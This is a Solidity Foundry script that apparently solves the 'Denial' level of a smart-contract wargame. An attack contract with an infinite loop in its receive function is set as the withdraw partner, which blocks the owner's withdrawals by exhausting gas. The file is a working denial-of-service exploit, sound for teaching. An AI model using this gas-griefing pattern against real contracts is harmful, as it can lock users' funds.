// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level20.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    Denial public denial =
        Denial(payable(0xB9059B79647f36BBe0fC8F0c1a570a5fa47e5d92));
    function gogo() external {
        denial.withdraw();
    }

    receive() external payable {
        while (true) {}
    }
}
contract DenialSolution is Script {
    Denial public denial =
        Denial(payable(0xB9059B79647f36BBe0fC8F0c1a570a5fa47e5d92));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(denial.owner());
        console.log(denial.partner());
        Attack attack = new Attack();
        denial.setWithdrawPartner(address(attack));
        attack.gogo();
        console.log(denial.owner());
        console.log(denial.partner());
        console.log(denial.contractBalance());
        // 0.001000000000000000
        // 0.000110949615710290

        vm.stopBroadcast();
    }
}
